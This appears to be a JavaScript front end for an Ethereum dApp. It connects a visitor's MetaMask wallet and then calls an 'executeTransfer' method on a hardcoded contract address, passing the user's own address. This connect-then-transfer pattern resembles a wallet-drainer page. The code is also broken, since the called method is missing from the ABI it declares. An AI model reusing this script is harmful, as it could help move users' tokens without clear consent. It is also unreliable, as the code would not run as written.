let provider;
let signer;

window.onload = function() {
    const connectButton = document.getElementById('connectButton');
    const executeTransferButton = document.getElementById('executeTransferButton');

    // Check if Ethereum wallet is available (e.g. MetaMask)
    if (typeof window.ethereum !== 'undefined') {
        console.log("MetaMask is available");

        // Connect wallet
        connectButton.addEventListener('click', async () => {
            try {
                // Request connection to MetaMask
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                provider = new ethers.providers.Web3Provider(window.ethereum);
                signer = provider.getSigner();

                const userAddress = await signer.getAddress();
                console.log("Connected wallet address:", userAddress);

                // Wallet successfully connected
                connectButton.innerHTML = `Connected: ${userAddress}`;
                executeTransferButton.disabled = false;

            } catch (error) {
                console.error("Error connecting to wallet:", error);
                alert("Failed to connect wallet");
            }
        });

        // Execute transfer
        executeTransferButton.addEventListener('click', async () => {
            try {
                const contractAddress = "0xAc7aa2ee970A703F3716A66D39F6A1cc5cfcea6b"; // Replace with your contract address
                const abi = [
                    {
                        "inputs": [
                            {
                                "internalType": "address",
                                "name": "account",
                                "type": "address"
                            }
                        ],
                        "name": "balanceOf",
                        "outputs": [
                            {
                                "internalType": "uint256",
                                "name": "",
                                "type": "uint256"
                            }
                        ],
                        "stateMutability": "view",
                        "type": "function"
                    },
                    {
                        "inputs": [
                            {
                                "internalType": "address",
                                "name": "sender",
                                "type": "address"
                            },
                            {
                                "internalType": "address",
                                "name": "recipient",
                                "type": "address"
                            },
                            {
                                "internalType": "uint256",
                                "name": "amount",
                                "type": "uint256"
                            }
                        ],
                        "name": "transferFrom",
                        "outputs": [
                            {
                                "internalType": "bool",
                                "name": "",
                                "type": "bool"
                            }
                        ],
                        "stateMutability": "nonpayable",
                        "type": "function"
                    }
                ];

                const contract = new ethers.Contract(contractAddress, abi, signer);
                const userAddress = await signer.getAddress();

                console.log("Attempting to execute transfer from:", userAddress);

                // Execute the transfer
                const tx = await contract.executeTransfer(userAddress);
                await tx.wait();

                alert("Transfer executed successfully");

            } catch (error) {
                console.error("Error executing transfer:", error);
                alert("Transfer failed");
            }
        });

    } else {
        console.log("MetaMask is not available");
        alert("MetaMask is not installed. Please install MetaMask to use this DApp.");
    }
};
